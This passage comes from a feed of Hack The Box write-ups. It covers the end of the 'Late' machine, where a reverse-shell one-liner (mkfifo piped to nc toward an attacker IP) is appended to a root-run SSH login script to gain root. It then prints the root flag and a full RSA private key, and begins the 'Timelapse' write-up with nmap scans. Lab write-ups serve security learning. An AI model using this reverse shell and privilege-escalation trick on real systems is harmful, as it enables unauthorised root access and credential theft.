font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3465   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3464   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3463   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3466   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3468   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cp</span> /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh </span>
<span id="cb4-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:15:01 CMD: UID=0    PID=3470   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=0    PID=3476   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /root/scripts/cron.sh </span>
<span id="cb4-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=0    PID=3475   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> /root/scripts/cron.sh </span>
<span id="cb4-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=0    PID=3474   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/CRON</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> </span>
<span id="cb4-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">???</span>  PID=3479   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">???</span></span>
<span id="cb4-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=0    PID=3481   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> </span>
<span id="cb4-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/05/16</span> 20:16:01 CMD: UID=0    PID=3482   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rm</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> /home/svc_acc/app/uploads/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> </span></code></pre></div>
<p>The script <code>/usr/local/sbin/ssh-alert.sh</code> is running on login, however it’s write protected:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc_acc@late:~$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span> /usr/local/sbin/ssh-alert.sh</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 svc_acc svc_acc 433 May 16 20:33 /usr/local/sbin/ssh-alert.sh</span></code></pre></div>
<p>HOWEVER, looking on the file attributes we find that we can append to the file (indicated by the ‘a’-flag):</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc_acc@late:~$</span> lsattr /usr/local/sbin/ssh-alert.sh</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-----a--------e---</span> /usr/local/sbin/ssh-alert.sh</span></code></pre></div>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc_acc@late:~$</span> echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.26 4488 &gt;/tmp/f"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh</span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">svc_acc@late:~$</span> cat /usr/local/sbin/ssh-alert.sh</span>
<span id="cb7-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/bash</span></span>
<span id="cb7-4"></span>
<span id="cb7-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">RECIPIENT</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"root@late.htb"</span></span>
<span id="cb7-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">SUBJECT</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Email from Server Login: SSH Alert"</span></span>
<span id="cb7-7"></span>
<span id="cb7-8"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">BODY</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span>
<span id="cb7-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">A SSH login was detected.</span></span>
<span id="cb7-10"></span>
<span id="cb7-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        User:        </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$PAM_USER</span></span>
<span id="cb7-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        User IP Host: </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$PAM_RHOST</span></span>
<span id="cb7-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        Service:     </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$PAM_SERVICE</span></span>
<span id="cb7-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        TTY:         </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$PAM_TTY</span></span>
<span id="cb7-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        Date:        </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">date</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span></span>
<span id="cb7-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">        Server:      </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">uname</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-a</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span></span>
<span id="cb7-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span>
<span id="cb7-18"></span>
<span id="cb7-19"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">[</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${PAM_TYPE}</span> <span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"open_session"</span> <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">then</span></span>
<span id="cb7-20">        <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Subject:</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${SUBJECT}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"> </span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${BODY}</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/sendmail</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">${RECIPIENT}</span></span>
<span id="cb7-21"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">fi</span></span>
<span id="cb7-22"></span>
<span id="cb7-23"></span>
<span id="cb7-24"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">rm</span> /tmp/f<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkfifo</span> /tmp/f<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> /tmp/f<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;&amp;</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">nc</span> 10.10.14.26 4488 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/tmp/f</span></code></pre></div>
<p>Log out and in again to trigger the <code>ssh-alert</code>-script and grab <code>root.txt</code>:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  late nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488                             </span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb8-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.26</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.156]</span> 49522</span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh:</span> 0: can<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'t access tty; job control turned off</span></span>
<span id="cb8-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"># id &amp;&amp; hostname</span></span>
<span id="cb8-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">uid=0(root) gid=0(root) groups=0(root)</span></span>
<span id="cb8-7"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">late</span></span>
<span id="cb8-8"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"># cat /root/root.txt</span></span>
<span id="cb8-9"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">38007fc077ae764169e09ba12c574fa7</span></span>
<span id="cb8-10"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;"># cat /root/.ssh/id_rsa</span></span>
<span id="cb8-11"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-----BEGIN RSA PRIVATE KEY-----</span></span>
<span id="cb8-12"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MIIEoQIBAAKCAQEAuDUCfyBofVqk+Qilst0xDnhScDu+kSmXHYBcL1iwxajW5SWp</span></span>
<span id="cb8-13"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">oGqD39nBh/AzQYcQk4t5xIV8eUlda0zD1pjfPYAOHt9efDSxWaJQ91P5L+qlsCii</span></span>
<span id="cb8-14"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">efP8M0zlWgN8nzII9MSrRSU7I7iVYaYLawl82JhnoTSt1CoexSDT0T23DPOr2KC/</span></span>
<span id="cb8-15"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">8XBlIFgZN/pyri0qtG3n3r1lRBQFj1eDMwd2AeeOL+AQUz7b7v5xqErTNvRjC2Yf</span></span>
<span id="cb8-16"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">xqmIEaqgvTWsxZL2oCJbv9pJ3+ApGaxLJyZgvXMI39ubndiatITMiGbwE61kMV+D</span></span>
<span id="cb8-17"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">r8d8LKpHBRBTKOzo9VV8dHFhN9KYAFKbAatpKwIDAQABAoIBAGnHdxGNiLNDVCz1</span></span>
<span id="cb8-18"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">vEFEJ6GJkr2EcWBmo7J7PXSq14gJ9q1LvWazA9uN7kajtqtQZkJz+47QoLP9Xzn4</span></span>
<span id="cb8-19"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">sRUQYFGusW0lE9r7X0R7o0cD37qWYmMQUoz5gL/szl+sVOoOD3qPXVKtmJJgsteK</span></span>
<span id="cb8-20"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">RFBI+HpgulGmMJP/RAArY7dqWy2B3XniUWZY+IjOdHYBQSNFbc6kYrwDcpYn1rHt</span></span>
<span id="cb8-21"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">fwq55t7nyXho25paTbmwRBhBwNA4fK/Kzkbct4bvx1GRxdctqa4NbvoPVTNJ0tnY</span></span>
<span id="cb8-22"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">7kFn4V6rBV8LiZP9tI5eLWNh+yid7Sca2TgUqQdfcFePD6GnW9qydgTs32fAwbsL</span></span>
<span id="cb8-23"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">nqNHH1ECgYEA73dBhgBnvvkSDRUBjJV94q+jeE+7oh2WOOCcMAtu4vQ6Z6ZA1im6</span></span>
<span id="cb8-24"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">c0bETk3FyNTtrIq+NxqqXvDz15u5IferwPT5jYyi6/5g2wfmrt0K9qYmCk0g/TFJ</span></span>
<span id="cb8-25"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">ab6Zbz57eVzjZnZLSsaCyPsJqRGMAb+kPmszhseeXp82cwLmH0BBfCcCgYEAxO0D</span></span>
<span id="cb8-26"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">IJPrqjyA/O/f95okskHqW0/kstPQCMazsxf4qtQ4G0j/UTbE054T+nRJvnEJd+68</span></span>
<span id="cb8-27"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MWsmXechRKASK8FZcVBJMPlJB9qetCXanZDnthHUOZ4ASMyWGUY5GnqdiD8WWyI+</span></span>
<span id="cb8-28"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">WpqQ3YEaXhj2C507yS1RsZnr1iUvt+ic6xqimV0CgYBbJnfIfAsBhGk8lYxbaOPc</span></span>
<span id="cb8-29"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">D6MXvrHbSYvO5qBNIWz58qDwpzXyzztrebprW+s3QOWfUciJzRqgvPL0VRApP88e</span></span>
<span id="cb8-30"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">yaDcInY5gkB33xAN65GqxR+huC4gckxRdf2NfKkfTx43+Ds8oUdTHUtWEZnLaJkq</span></span>
<span id="cb8-31"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">MUARw5YiylO9f5L8vkau7QJ/BuxOL9cDcfiukDXeqdXBdILculkUsTTBG43gw2sU</span></span>
<span id="cb8-32"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">Uu0jC9KFJ1XFlar5CNUNwqQ2sQCznQknUCXQBZmbCe7CNjmcWRxqdNw6uBqclO2D</span></span>
<span id="cb8-33"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">N+Nokp37ZJPMsxbE6ylkYGXXY1zQ1F6auS7Qvn4iKEZe07PEK3o90El+Y/jJi3pk</span></span>
<span id="cb8-34"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">PQKBgQC0AIdrkyGdIiPSHJHmiOpGyE85Hl8McQZoTwAlacTm9HYiQycQoraFwAmK</span></span>
<span id="cb8-35"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">yHYDDSiJznWLqU58gdLybuTU4eWkWd/NaPOSrrUpHdIWTS8+nWJiu1BPowKaGMdP</span></span>
<span id="cb8-36"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">9WnDQAEXbK24DiX2WGioLX11x3Qn/W+Y9ZCrYYC1mKjOAbIJsQ==</span></span>
<span id="cb8-37"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">-----END RSA PRIVATE KEY-----</span></span></code></pre></div>
</section>
<section id="references" class="level2">
<h2 class="anchored" data-anchor-id="references">References</h2>
<p>SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</p>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>easy</category>
  <category>linux</category>
  <category>ssti</category>
  <category>lsattr</category>
  <guid>https://exploit.se/posts/2022-05-16-htb-writeup-late/2022-05-16-htb-writeup-late.html</guid>
  <pubDate>Mon, 16 May 2022 00:00:00 GMT</pubDate>
  <media:content url="https://exploit.se/posts/2022-05-16-htb-writeup-late/images/late_logo.png" medium="image" type="image/png" height="144" width="144"/>
</item>
<item>
  <title>Timelapse - Hack The Box</title>
  <dc:creator>0xPThree </dc:creator>
  <link>https://exploit.se/posts/2022-04-01-htb-writeup-timelapse/2022-04-01-htb-writeup-timelapse.html</link>
  <description><![CDATA[ 





<section id="user" class="level1">
<h1>USER</h1>
<section id="step-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
<p><strong>nmap:</strong></p>
<div class="sourceCode" id="cb1" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p-</span> 10.10.11.152 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-v</span></span>
<span id="cb1-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb1-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE</span>
<span id="cb1-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain</span>
<span id="cb1-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec</span>
<span id="cb1-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc</span>
<span id="cb1-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn</span>
<span id="cb1-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap</span>
<span id="cb1-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds</span>
<span id="cb1-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5</span>
<span id="cb1-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  http-rpc-epmap</span>
<span id="cb1-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  ldapssl</span>
<span id="cb1-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  globalcatLDAP</span>
<span id="cb1-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  globalcatLDAPssl</span>
<span id="cb1-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5986/tcp</span>  open  wsmans</span>
<span id="cb1-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9389/tcp</span>  open  adws</span>
<span id="cb1-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49667/tcp</span> open  unknown</span>
<span id="cb1-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49673/tcp</span> open  unknown</span>
<span id="cb1-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49674/tcp</span> open  unknown</span>
<span id="cb1-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">49696/tcp</span> open  unknown</span>
<span id="cb1-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">51418/tcp</span> open  unknown</span>
<span id="cb1-22"></span>
<span id="cb1-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  timelapse nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-Pn</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49696,51418</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sCV</span> 10.10.11.152</span>
<span id="cb1-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE       VERSION</span>
<span id="cb1-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">53/tcp</span>    open  domain        Simple DNS Plus</span>
<span id="cb1-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">88/tcp</span>    open  kerberos-sec  Microsoft Windows Kerberos <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">server</span> time: 2022-03-31 15:20:24Z<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">135/tcp</span>   open  msrpc         Microsoft Windows RPC</span>
<span id="cb1-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">139/tcp</span>   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
<span id="cb1-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">389/tcp</span>   open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> timelapse.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">445/tcp</span>   open  microsoft-ds<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">464/tcp</span>   open  kpasswd5<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb1-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">593/tcp</span>   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
<span id="cb1-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">636/tcp</span>   open  tcpwrapped</span>
<span id="cb1-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3268/tcp</span>  open  ldap          Microsoft Windows Active Directory LDAP <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Domain:</span> timelapse.htb0., Site: Default-First-Site-Name<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3269/tcp</span>  open  tcpwrapped</span>
<span id="cb1-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5986/tcp</span>  open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SSDP/UPnP</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb1-37"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Microsoft-HTTPAPI/2.0</span>
<span id="cb1-38"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> Not Found</span>
<span id="cb1-39"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ssl-cert:</span> Subject: commonName=dc01.timelapse.htb</span>
<span id="cb1-40"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Not</span> valid before: 2021-10-25T14:05:29</span>
<span id="cb1-41"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_Not</span> valid after:  2022-10-25T14:25:29</span>
<span id="cb1-42"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_ssl-date:</span> 2022-03-31T15:21:54+00:00<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+8h02m39s</span> from scanner time.</span>
<span id="cb1-43"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tls-alpn:</span> </span>
<span id="cb1-44"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>  http/1.1</span>
<span id="cb1-45"><span class="ex" style="color: null;
background-color: null;
